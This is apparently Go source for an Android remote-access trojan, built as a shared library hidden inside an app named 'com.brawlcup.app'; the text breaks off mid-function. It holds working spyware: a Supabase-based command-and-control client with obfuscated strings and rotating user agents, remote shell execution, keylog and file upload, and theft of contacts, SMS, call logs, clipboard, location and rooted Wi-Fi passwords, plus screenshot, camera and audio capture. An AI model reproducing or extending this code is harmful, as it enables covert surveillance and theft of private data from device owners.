package main

// Built with -buildmode=c-shared.
// When Android loads this via System.loadLibrary("agent"),
// Go's init() starts the agent in a background goroutine.

// Seccomp SIGSYS trap: Android's seccomp sandbox blocks certain
// syscalls (e.g. memfd_create on older devices). The kernel sends
// SIGSYS which kills the process. This handler catches SIGSYS and
// makes the blocked syscall return -ENOSYS so Go's runtime falls
// back to alternatives (e.g. regular mmap instead of memfd_create).
// The __attribute__((constructor)) ensures the handler is installed
// before Go's runtime init makes any syscalls.

// #include <signal.h>
// #include <errno.h>
// #include <string.h>
// #include <stdint.h>
// #include <stdlib.h>
// #include <sys/system_properties.h>
//
// static void _seccomp_trap(int sig, siginfo_t *si, void *ucp) {
//     (void)sig; (void)si;
// #if defined(__arm__)
//     ((ucontext_t *)ucp)->uc_mcontext.arm_r0 = (unsigned long)(-ENOSYS);
// #elif defined(__aarch64__)
//     ((ucontext_t *)ucp)->uc_mcontext.regs[0] = (uint64_t)(-ENOSYS);
// #elif defined(__i386__)
//     ((ucontext_t *)ucp)->uc_mcontext.gregs[REG_EAX] = -ENOSYS;
// #elif defined(__x86_64__)
//     ((ucontext_t *)ucp)->uc_mcontext.gregs[REG_RAX] = -ENOSYS;
// #endif
// }
//
// __attribute__((constructor))
// static void _init_seccomp_trap(void) {
//     struct sigaction sa;
//     memset(&sa, 0, sizeof(sa));
//     sa.sa_sigaction = _seccomp_trap;
//     sa.sa_flags = SA_SIGINFO | SA_NODEFER;
//     sigaction(SIGSYS, &sa, NULL);
// }
//
// // Read Android system property via the property service.
// // This works from sandboxed apps — it uses a shared memory region,
// // not shell commands. Available on all Android versions.
// static int get_system_property(const char *name, char *value) {
//     return __system_property_get(name, value);
// }
import "C"

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================
// CONFIG — replaced by build_android.py at build time
// ============================================================

var (
	c2Domain1 = "PLACEHOLDER_C2_DOMAIN_1"
	c2Domain2 = "PLACEHOLDER_C2_DOMAIN_2"
	c2APIKey  = "PLACEHOLDER_C2_APIKEY"
	xorKey    = byte(0x5A)
)

// ============================================================
// XOR STRING OBFUSCATION (matches Windows agent)
// ============================================================

var (
	encContentType = []byte{0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34, 0x61, 0x39, 0x32, 0x3B, 0x28, 0x29, 0x3F, 0x2E, 0x67, 0x2F, 0x2E, 0x3C, 0x77, 0x62}
	encAPIKey      = []byte{0x3B, 0x2A, 0x33, 0x31, 0x3F, 0x23}
	encAuth        = []byte{0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34}
	encBearer      = []byte{0x18, 0x3F, 0x3B, 0x28, 0x3F, 0x28, 0x7A}
	encPrefer      = []byte{0x0A, 0x28, 0x3F, 0x3C, 0x3F, 0x28}
	encUpsert      = []byte{0x28, 0x3F, 0x29, 0x35, 0x36, 0x2F, 0x2E, 0x33, 0x35, 0x34, 0x67, 0x37, 0x3F, 0x28, 0x3D, 0x3F, 0x77, 0x3E, 0x2F, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x3F, 0x29}
)

func xd(data []byte) string {
	r := make([]byte, len(data))
	for i, b := range data {
		r[i] = b ^ xorKey
	}
	return string(r)
}

// User agents for requests
var userAgents = []string{
	"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Android 11; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
}

// ============================================================
// SUPABASE C2 CLIENT
// ============================================================

type SupabaseC2 struct {
	domains   []string
	apiKey    string
	machineID string
	client    *http.Client
}

type Command struct {
	ID        string `json:"id"`
	MachineID string `json:"machine_id"`
	Command   string `json:"command"`
	Args      string `json:"args"`
	Status    string `json:"status"`
	Result    string `json:"result"`
}

func NewC2(domains []string, apiKey, machineID string) *SupabaseC2 {
	return &SupabaseC2{
		domains:   domains,
		apiKey:    apiKey,
		machineID: machineID,
		client:    &http.Client{Timeout: 30 * time.Second},
	}
}

func (c *SupabaseC2) doRequest(method, path string, body io.Reader, extra map[string]string) (*http.Response, error) {
	for _, domain := range c.domains {
		url := "https://" + domain + path
		req, err := http.NewRequest(method, url, body)
		if err != nil {
			continue
		}
		// Set Content-Type for requests with a body
		if body != nil {
			req.Header.Set("Content-Type", xd(encContentType))
		}
		req.Header.Set(xd(encAPIKey), c.apiKey)
		req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
		req.Header.Set("X-Machine-ID", c.machineID)
		// Randomize User-Agent
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		for k, v := range extra {
			req.Header.Set(k, v)
		}
		resp, err := c.client.Do(req)
		if err != nil {
			continue
		}
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			return resp, nil
		}
		// Non-2xx: read body for error context, close, and try next domain
		errBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if len(c.domains) == 1 || domain == c.domains[len(c.domains)-1] {
			return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(errBody))
		}
	}
	return nil, fmt.Errorf("all C2 domains failed")
}

func (c *SupabaseC2) Register(name, user, osInfo, ip string, isAdmin bool) error {
	payload := map[string]interface{}{
		"machine_id":   c.machineID,
		"machine_name": name,
		"username":     user,
		"os":           osInfo,
		"ip":           ip,
		"is_admin":     isAdmin,
		"last_seen":    time.Now().UTC().Format(time.RFC3339),
		"created_at":   time.Now().UTC().Format(time.RFC3339),
	}
	data, _ := json.Marshal(payload)
	// Use same query format as Windows agent
	resp, err := c.doRequest("POST", "/rest/v1/clients?on_conflict=machine_id", bytes.NewReader(data), map[string]string{
		xd(encPrefer): xd(encUpsert),
	})
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func (c *SupabaseC2) Heartbeat() {
	payload := map[string]interface{}{
		"last_seen": time.Now().UTC().Format(time.RFC3339),
		"ip":        getPublicIP(),
		"is_admin":  isRooted(),
	}
	data, _ := json.Marshal(payload)
	resp, err := c.doRequest("PATCH", "/rest/v1/clients?machine_id=eq."+c.machineID, bytes.NewReader(data), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func getPublicIP() string {
	// Use Go net/http like Windows agent (curl may not exist on Android)
	cl := &http.Client{Timeout: 5 * time.Second}
	for _, svc := range []string{"https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"} {
		resp, err := cl.Get(svc)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		ip := strings.TrimSpace(string(body))
		if ip != "" {
			return ip
		}
	}
	return "unknown"
}

func (c *SupabaseC2) PollCommands() []Command {
	// Match Windows agent - no limit
	path := fmt.Sprintf("/rest/v1/commands?or=(machine_id.eq.%s,machine_id.eq.*)&status=eq.pending&order=created_at.asc", c.machineID)
	resp, err := c.doRequest("GET", path, nil, nil)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	var cmds []Command
	json.NewDecoder(resp.Body).Decode(&cmds)
	return cmds
}

func (c *SupabaseC2) UpdateCommand(id, status, result string) {
	if len(result) > 50000 {
		result = result[:50000] + "\n...[truncated]"
	}
	payload := map[string]interface{}{
		"status":      status,
		"result":      result,
		"executed_at": time.Now().UTC().Format(time.RFC3339),
	}
	data, _ := json.Marshal(payload)
	resp, err := c.doRequest("PATCH", "/rest/v1/commands?id=eq."+id, bytes.NewReader(data), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func (c *SupabaseC2) SendSystemInfo(infoType string, data interface{}) {
	payload := map[string]interface{}{
		"machine_id": c.machineID,
		"info_type":  infoType,
		"data":       data,
		"created_at": time.Now().UTC().Format(time.RFC3339),
	}
	d, _ := json.Marshal(payload)
	resp, err := c.doRequest("POST", "/rest/v1/system_info", bytes.NewReader(d), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func (c *SupabaseC2) SendKeylog(keys, windowTitle string) {
	payload := map[string]interface{}{
		"machine_id":   c.machineID,
		"keystrokes":   keys,
		"window_title": windowTitle,
		"created_at":   time.Now().UTC().Format(time.RFC3339),
	}
	d, _ := json.Marshal(payload)
	resp, err := c.doRequest("POST", "/rest/v1/keylogs", bytes.NewReader(d), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func (c *SupabaseC2) UploadFile(filename string, data []byte, fileType string) error {
	// Match Windows agent - send raw binary with headers
	req, err := http.NewRequest("POST", "https://"+c.domains[0]+"/functions/v1/file-upload", bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set(xd(encAPIKey), c.apiKey)
	req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
	req.Header.Set("X-Machine-ID", c.machineID)
	req.Header.Set("X-Filename", filename)
	req.Header.Set("X-Filepath", "")
	req.Header.Set("X-Type", fileType)
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := c.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("upload HTTP %d", resp.StatusCode)
	}
	return nil
}

// ============================================================
// JOB MANAGER
// ============================================================

type JobManager struct {
	mu   sync.Mutex
	jobs map[string]context.CancelFunc
}

func NewJobManager() *JobManager {
	return &JobManager{jobs: make(map[string]context.CancelFunc)}
}

func (jm *JobManager) Start(name string, fn func(ctx context.Context)) {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	if cancel, ok := jm.jobs[name]; ok {
		cancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	jm.jobs[name] = cancel
	go fn(ctx)
}

func (jm *JobManager) Stop(name string) bool {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	if cancel, ok := jm.jobs[name]; ok {
		cancel()
		delete(jm.jobs, name)
		return true
	}
	return false
}

func (jm *JobManager) StopAll() {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	for name, cancel := range jm.jobs {
		cancel()
		delete(jm.jobs, name)
	}
}

func (jm *JobManager) List() []string {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	var names []string
	for name := range jm.jobs {
		names = append(names, name)
	}
	return names
}

// ============================================================
// SHELL UTILITIES
// ============================================================

// findShell locates a working shell binary on the device.
var shellPath string
var shellOnce sync.Once

func getShell() string {
	shellOnce.Do(func() {
		candidates := []string{
			"/system/bin/sh",
			"/system/bin/bash",
			"/vendor/bin/sh",
			"/system/xbin/sh",
		}
		for _, p := range candidates {
			if _, err := os.Stat(p); err == nil {
				shellPath = p
				return
			}
		}
		// Last resort: hope PATH works
		shellPath = "sh"
	})
	return shellPath
}

func shellExec(cmd string) (string, error) {
	c := exec.Command(getShell(), "-c", cmd)
	out, err := c.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func shellExecTimeout(cmd string, timeout time.Duration) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	c := exec.CommandContext(ctx, getShell(), "-c", cmd)
	out, err := c.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func getProp(key string) string {
	// Primary: use Android's __system_property_get() via CGO.
	// This reads from the shared property memory region and works
	// from sandboxed apps on ALL Android versions (no shell needed).
	cKey := C.CString(key)
	defer C.free(unsafe.Pointer(cKey))
	var cValue [C.PROP_VALUE_MAX + 1]C.char
	n := C.get_system_property(cKey, &cValue[0])
	if n > 0 {
		return C.GoString(&cValue[0])
	}

	// Fallback: read from build.prop files (covers edge cases)
	val := getPropFromFiles(key)
	if val != "" {
		return val
	}

	// Last resort: try shell getprop (works on older non-sandboxed Android)
	out, err := shellExec("getprop " + key)
	if err == nil && out != "" {
		return out
	}
	return ""
}

// propFiles lists Android property files in priority order.
var propFiles = []string{
	"/system/build.prop",
	"/vendor/build.prop",
	"/product/build.prop",
	"/odm/build.prop",
	"/system/default.prop",
}

var propCache map[string]string
var propCacheOnce sync.Once

func loadPropFiles() {
	propCache = make(map[string]string)
	for _, path := range propFiles {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			if idx := strings.Index(line, "="); idx > 0 {
				k := strings.TrimSpace(line[:idx])
				v := strings.TrimSpace(line[idx+1:])
				if _, exists := propCache[k]; !exists {
					propCache[k] = v
				}
			}
		}
	}
}

func getPropFromFiles(key string) string {
	propCacheOnce.Do(loadPropFiles)
	return propCache[key]
}

// ============================================================
// MACHINE ID
// ============================================================

func getMachineID() string {
	// Match Windows agent length (16 hex chars = 8 bytes).
	// Use multiple sources to build a unique fingerprint that works
	// even when shell commands are blocked by Android's sandbox.
	var fp strings.Builder

	// Try Android ID via shell (works on older Android)
	aid, _ := shellExec("settings get secure android_id")
	if aid != "" && aid != "null" {
		fp.WriteString(aid)
	}

	// Build fingerprint — unique per ROM build, always available from build.prop
	fingerprint := getProp("ro.build.fingerprint")
	fp.WriteString(fingerprint)

	// Serial number
	serial := getProp("ro.serialno")
	fp.WriteString(serial)

	// Model + device combo
	fp.WriteString(getProp("ro.product.model"))
	fp.WriteString(getProp("ro.product.device"))
	fp.WriteString(getProp("ro.product.board"))

	// If we still have nothing useful, generate a persistent UUID
	if fp.Len() == 0 {
		fp.WriteString(getOrCreatePersistentID())
	}

	hash := sha256.Sum256([]byte(fp.String()))
	return hex.EncodeToString(hash[:8]) // 16 hex chars
}

// getOrCreatePersistentID generates a random ID and persists it to disk
// as a last resort when all other device identifiers are unavailable.
func getOrCreatePersistentID() string {
	// Try common app data paths
	paths := []string{
		"/data/data/com.brawlcup.app/files/.mid",
		"/data/user/0/com.brawlcup.app/files/.mid",
	}
	// Read existing
	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err == nil && len(data) > 0 {
			return strings.TrimSpace(string(data))
		}
	}
	// Generate new
	buf := make([]byte, 16)
	for i := range buf {
		buf[i] = byte(rand.Intn(256))
	}
	id := hex.EncodeToString(buf)
	// Try to persist
	for _, p := range paths {
		dir := filepath.Dir(p)
		os.MkdirAll(dir, 0700)
		if os.WriteFile(p, []byte(id), 0600) == nil {
			break
		}
	}
	return id
}

// ============================================================
// DEVICE INFO
// ============================================================

func getDeviceInfo() map[string]interface{} {
	info := make(map[string]interface{})

	// --- Fields used by registration (clients table) ---
	model := getProp("ro.product.model")
	brand := getProp("ro.product.brand")
	manufacturer := getProp("ro.product.manufacturer")
	androidVer := getProp("ro.build.version.release")
	sdkVer := getProp("ro.build.version.sdk")
	abi := getProp("ro.product.cpu.abi")

	info["platform"] = "android"
	info["model"] = model
	info["brand"] = brand
	info["manufacturer"] = manufacturer
	info["device"] = getProp("ro.product.device")
	info["android_version"] = androidVer
	info["sdk_version"] = sdkVer
	info["build_id"] = getProp("ro.build.display.id")
	info["security_patch"] = getProp("ro.build.version.security_patch")
	info["serial"] = getProp("ro.serialno")
	info["hardware"] = getProp("ro.hardware")
	info["board"] = getProp("ro.product.board")
	info["abi"] = abi
	info["fingerprint"] = getProp("ro.build.fingerprint")

	// --- Fields expected by dashboard SystemInfoTab ---

	// Hardware card: cpu, total_ram_mb, avail_ram_mb, screen, arch
	cpuInfo := getProp("ro.hardware")
	if cpuInfo == "" {
		cpuInfo = readCPUInfo()
	}
	info["cpu"] = cpuInfo
	info["arch"] = abi
	totalMB, availMB := getMemoryMB()
	info["total_ram_mb"] = totalMB
	info["avail_ram_mb"] = availMB
	info["screen"] = getScreenResolution()

	// Network card: public_ip, network (array of {name, ip})
	publicIP := getPublicIP()
	info["public_ip"] = publicIP
	info["external_ip"] = publicIP
	info["network"] = getNetworkInterfaces()

	// Local IP for registration
	ip, _ := shellExec("ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1")
	if ip == "" {
		ip = getLocalIPFromProc()
	}
	if ip == "" {
		ip = publicIP
	}
	info["ip"] = ip

	// Security card: is_admin, antivirus, pid, is_vm, is_debugged, analysis_tools
	rooted := isRooted()
	info["rooted"] = rooted
	info["is_admin"] = rooted
	info["antivirus"] = "N/A (Android)"
	info["pid"] = os.Getpid()
	info["is_vm"] = isEmulator()
	info["is_debugged"] = false
	info["analysis_tools"] = []string{}

	// System card: computer_name, username, os
	deviceName := strings.TrimSpace(brand + " " + model)
	if deviceName == "" || deviceName == " " {
		deviceName = strings.TrimSpace(manufacturer + " " + getProp("ro.product.device"))
	}
	info["computer_name"] = deviceName
	user, _ := shellExec("whoami")
	if user == "" {
		user = "app"
	}
	info["username"] = user
	osStr := fmt.Sprintf("Android %s (SDK %s)", androidVer, sdkVer)
	info["os"] = osStr

	// Clipboard
	clip, _ := shellExec("service call clipboard 2 s16 com.brawlcup.app 2>/dev/null")
	info["clipboard"] = clip

	// Running processes
	info["running_procs"] = getRunningProcs()

	// Battery
	battery, _ := shellExec("dumpsys battery 2>/dev/null | grep -E 'level|status|temperature' | head -5")
	if battery == "" {
		battery = readBatterySysfs()
	}
	info["battery"] = battery

	// Storage
	info["storage"] = getStorageInfo()

	// Uptime
	uptimeData := readFileHead("/proc/uptime", 1)
	if parts := strings.Fields(uptimeData); len(parts) > 0 {
		info["uptime_seconds"] = parts[0]
	}

	return info
}

// readCPUInfo reads processor name from /proc/cpuinfo.
func readCPUInfo() string {
	data, err := os.ReadFile("/proc/cpuinfo")
	if err != nil {
		return "unknown"
	}
	for _, line := range strings.Split(string(data), "\n") {
		// ARM uses "Hardware", x86 uses "model name"
		for _, prefix := range []string{"Hardware\t:", "model name\t:"} {
			if strings.HasPrefix(line, prefix) {
				return strings.TrimSpace(strings.TrimPrefix(line, prefix))
			}
		}
	}
	return getProp("ro.product.board")
}

// getMemoryMB reads total and available memory from /proc/meminfo.
func getMemoryMB() (int, int) {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0, 0
	}
	var total, avail int
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		val := 0
		fmt.Sscanf(fields[1], "%d", &val)
		switch fields[0] {
		case "MemTotal:":
			total = val / 1024 // kB to MB
		case "MemAvailable:":
			avail = val / 1024
		}
	}
	return total, avail
}

// getScreenResolution tries to read display resolution.
func getScreenResolution() string {
	// Try dumpsys display (may be blocked in sandbox)
	out, _ := shellExec("dumpsys display 2>/dev/null | grep -o 'real [0-9]*x[0-9]*' | head -1")
	if out != "" {
		return strings.TrimPrefix(out, "real ")
	}
	// Try wm size
	out, _ = shellExec("wm size 2>/dev/null")
	if strings.Contains(out, "x") {
		parts := strings.Fields(out)
		if len(parts) > 0 {
			return parts[len(parts)-1]
		}
	}
	return "unknown"
}

// getNetworkInterfaces reads network interface IPs from /proc/net/fib_trie.
func getNetworkInterfaces() []map[string]string {
	var ifaces []map[string]string
	// Read interface names and IPs from /sys/class/net/
	data, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return ifaces
	}
	seen := make(map[string]bool)
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 || fields[0] == "Iface" || fields[0] == "lo" {
			continue
		}
		ifName := fields[0]
		if seen[ifName] {
			continue
		}
		seen[ifName] = true
		ip := getIfaceIPFromProc(ifName)
		if ip != "" {
			ifaces = append(ifaces, map[string]string{"name": ifName, "ip": ip})
		}
	}
	return ifaces
}

// getIfaceIPFromProc reads IP for an interface from /proc/net/if_inet6 or /sys.
func getIfaceIPFromProc(iface string) string {
	// Read from /proc/net/fib_trie — look for LOCAL entries after the interface
	data, err := os.ReadFile("/proc/1/net/fib_trie")
	if err != nil {
		data, err = os.ReadFile("/proc/net/fib_trie")
	}
	if err != nil {
		return ""
	}
	lines := strings.Split(string(data), "\n")
	for i, line := range lines {
		if strings.Contains(line, "/LOCAL") {
			// The IP is on the previous line with leading spaces
			if i > 0 {
				ip := strings.TrimSpace(lines[i-1])
				// Skip loopback and link-local
				if ip != "" && ip != "127.0.0.1" && !strings.HasPrefix(ip, "127.") && !strings.HasPrefix(ip, "169.254.") {
					return ip
				}
			}
		}
	}
	return ""
}

// getRunningProcs returns a list of running process names.
func getRunningProcs() []string {
	// Try ps command first
	out, err := shellExec("ps -A -o NAME 2>/dev/null | tail -n +2 | head -80")
	if err == nil && out != "" {
		return strings.Split(strings.TrimSpace(out), "\n")
	}
	// Fallback: read /proc/<pid>/cmdline
	var procs []string
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return procs
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		// Check if dirname is numeric (PID)
		pid := e.Name()
		isNum := true
		for _, c := range pid {
			if c < '0' || c > '9' {
				isNum = false
				break
			}
		}
		if !isNum {
			continue
		}
		cmdline, err := os.ReadFile("/proc/" + pid + "/cmdline")
		if err != nil || len(cmdline) == 0 {
			continue
		}
		// cmdline is null-delimited; take first arg
		name := strings.Split(string(cmdline), "\x00")[0]
		if name != "" {
			procs = append(procs, filepath.Base(name))
		}
		if len(procs) >= 80 {
			break
		}
	}
	return procs
}

// readFileHead reads the first N lines of a file directly.
func readFileHead(path string, lines int) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	allLines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(allLines) > lines {
		allLines = allLines[:lines]
	}
	return strings.Join(allLines, "\n")
}

// getLocalIPFromProc reads local IP from /proc/net/fib_trie or /proc/net/route.
func getLocalIPFromProc() string {
	data, err := os.ReadFile("/proc/net/route")
	if err != nil {
		return ""
	}
	// Find non-loopback interface, then look up its IP from /proc/net/fib_trie
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 || fields[0] == "Iface" || fields[0] == "lo" {
			continue
		}
		if fields[1] == "00000000" { // default route
			iface := fields[0]
			return getIPForInterface(iface)
		}
	}
	return ""
}

// getIPForInterface reads the IP address for a given interface from /proc/net/if_inet6
// or /sys/class/net/<iface>/...
func getIPForInterface(iface string) string {
	// Try reading from /proc/net/fib_trie — complex, use /proc/net/tcp instead
	// Simplest: read all IPs from /proc/net/arp for the interface
	data, err := os.ReadFile("/proc/net/arp")
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 6 && fields[5] == iface && fields[0] != "IP" {
			return fields[0] // This is a neighbor's IP, not ours
		}
	}
	return ""
}

// readBatterySysfs reads battery info from sysfs (world-readable on most devices).
func readBatterySysfs() string {
	var parts []string
	batteryPaths := map[string]string{
		"level":       "/sys/class/power_supply/battery/capacity",
		"status":      "/sys/class/power_supply/battery/status",
		"temperature": "/sys/class/power_supply/battery/temp",
	}
	for label, path := range batteryPaths {
		data, err := os.ReadFile(path)
		if err == nil {
			parts = append(parts, label+": "+strings.TrimSpace(string(data)))
		}
	}
	return strings.Join(parts, "\n")
}

// getStorageInfo uses Go's syscall to get disk usage for /data.
func getStorageInfo() string {
	var stat syscall.Statfs_t
	if err := syscall.Statfs("/data", &stat); err != nil {
		return ""
	}
	total := stat.Blocks * uint64(stat.Bsize)
	free := stat.Bfree * uint64(stat.Bsize)
	used := total - free
	return fmt.Sprintf("Total: %dMB, Used: %dMB, Free: %dMB",
		total/(1024*1024), used/(1024*1024), free/(1024*1024))
}

func isRooted() bool {
	_, errSu := exec.LookPath("su")
	_, errMagisk := os.Stat("/sbin/magisk")
	_, errMagisk2 := os.Stat("/system/app/Superuser.apk")
	return errSu == nil || errMagisk == nil || errMagisk2 == nil
}

// ============================================================
// ANDROID-SPECIFIC COMMANDS
// ============================================================

func getContacts() (string, error) {
	return shellExecTimeout("content query --uri content://com.android.contacts/contacts --projection display_name:number 2>/dev/null | head -500", 15*time.Second)
}

func getSMS() (string, error) {
	return shellExecTimeout("content query --uri content://sms --projection address:body:date:type --sort \"date DESC\" 2>/dev/null | head -500", 15*time.Second)
}

func getCallLog() (string, error) {
	return shellExecTimeout("content query --uri content://call_log/calls --projection number:name:duration:date:type --sort \"date DESC\" 2>/dev/null | head -500", 15*time.Second)
}

func getInstalledApps() (string, error) {
	return shellExecTimeout("pm list packages -f 2>/dev/null", 15*time.Second)
}

func getWifiInfo() (string, error) {
	var sb strings.Builder

	// Current connection
	current, _ := shellExec("dumpsys wifi | grep 'mWifiInfo' | head -3")
	sb.WriteString("=== Current WiFi ===\n")
	sb.WriteString(current)
	sb.WriteString("\n\n")

	// Saved networks
	saved, _ := shellExec("dumpsys wifi | grep 'ConfigKey' | head -20")
	sb.WriteString("=== Saved Networks ===\n")
	sb.WriteString(saved)
	sb.WriteString("\n\n")

	// WiFi passwords (requires root)
	if isRooted() {
		passwords, _ := shellExec("su -c 'cat /data/misc/wifi/WifiConfigStore.xml' 2>/dev/null | grep -E 'SSID|PreSharedKey' | head -40")
		if passwords != "" {
			sb.WriteString("=== WiFi Passwords ===\n")
			sb.WriteString(passwords)
		}
	}

	return sb.String(), nil
}

func getLocation() (string, error) {
	// Try dumpsys location
	loc, _ := shellExecTimeout("dumpsys location | grep -A2 'last location' | head -10", 10*time.Second)
	if loc != "" {
		return loc, nil
	}
	// Fallback
	loc, _ = shellExecTimeout("dumpsys location | grep -E 'Location\\[' | head -5", 10*time.Second)
	return loc, nil
}

func getClipboard() (string, error) {
	return shellExecTimeout("service call clipboard 2 s16 com.brawlcup.app 2>/dev/null", 5*time.Second)
}

func takeScreenshot() ([]byte, error) {
	tmpPath := filepath.Join(os.TempDir(), "screen.png")
	defer os.Remove(tmpPath)

	_, err := shellExecTimeout("screencap -p "+tmpPath, 10*time.Second)
	if err != nil {
		// Try without -p flag
		_, err = shellExecTimeout("screencap "+tmpPath, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("screencap failed: %v", err)
		}
	}

	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func takePhoto() ([]byte, error) {
	tmpPath := filepath.Join(os.TempDir(), "photo.jpg")
	defer os.Remove(tmpPath)

	// Try using am to trigger camera capture (limited, needs root or specific setup)
	_, err := shellExecTimeout(fmt.Sprintf(
		"am start -a android.media.action.IMAGE_CAPTURE --ez return-data true 2>/dev/null; sleep 3; screencap -p %s",
		tmpPath), 15*time.Second)
	if err != nil {
		return nil, fmt.Errorf("camera capture failed: %v", err)
	}

	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func recordAudio(seconds int) ([]byte, error) {
	if seconds <= 0 || seconds > 300 {
		seconds = 30
	}
	tmpPath := filepath.Join(os.TempDir(), "recording.3gp")
	defer os.Remove(tmpPath)

	// Use mediarecorder via am or toolbox
	_, err := shellExecTimeout(fmt.Sprintf(
		"am startservice -a android.media.action.RECORD_AUDIO 2>/dev/null; "+
			"sleep %d; "+
			"am stopservice -a android.media.action.RECORD_AUDIO 2>/dev/null",
		seconds), time.Duration(seconds+10)*time.Second)
	if err != nil {
		// Fallback: try ffmpeg if available
		_, err = shellExecTimeout(fmt.Sprintf(
			"ffmpeg -f android_audio -i default -t %d -y %s 2>/dev/null",
			seconds, tmpPath), time.Duration(seconds+10)*time.Second)
		if err != nil {
			return nil, fmt.Errorf("audio recording failed: %v", err)
		}
	}

	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func getFolderTree(root string, maxDepth int) string {
	if root == "" {
		root = "/sdcard"
	}
	if maxDepth <= 0 {
		maxDepth = 3
	}
	var results []string
	walkDir(root, 0, maxDepth, &results, 500)
	if len(results) == 0 {
		return "(empty or access denied)"
	}
	return strings.Join(results, "\n")
}

func walkDir(dir string, depth, maxDepth int, results *[]string, limit int) {
	if depth >= maxDepth || len(*results) >= limit {
		return
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if len(*results) >= limit {
			return
		}
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			*results = append(*results, path+"/")
			walkDir(path, depth+1, maxDepth, results, limit)
		} else {
			info, _ := e.Info()
			size := int64(0)
			if info != nil {
				size = info.Size()
			}
			*results = append(*results, fmt.Sprintf("%s (%d bytes)", path, size))
		}
	}
}

// listDirectory returns JSON-formatted directory listing for the file manager tab.
func listDirectory(dir string) (string, error) {
	if dir == "" {
		dir = "/sdcard"
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", err
	}
	type FileEntry struct {
		Name  string `json:"name"`
		Path  string `json:"path"`
		IsDir bool   `json:"is_dir"`
		Size  int64  `json:"size"`
	}
	var files []FileEntry
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		size := int64(0)
		if info, err := e.Info(); err == nil {
			size = info.Size()
		}
		files = append(files, FileEntry{
			Name:  e.Name(),
			Path:  path,
			IsDir: e.IsDir(),
			Size:  size,
		})
	}
	data, _ := json.Marshal(files)
	return string(data), nil
}

// getProcessList returns running processes using pure Go.
func getProcessList() string {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		// Fallback to ps command
		out, _ := shellExecTimeout("ps -A 2>/dev/null || ps 2>/dev/null", 10*time.Second)
		return out
	}
	var lines []string
	lines = append(lines, fmt.Sprintf("%-8s %-40s %s", "PID", "NAME", "STATE"))
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid := e.Name()
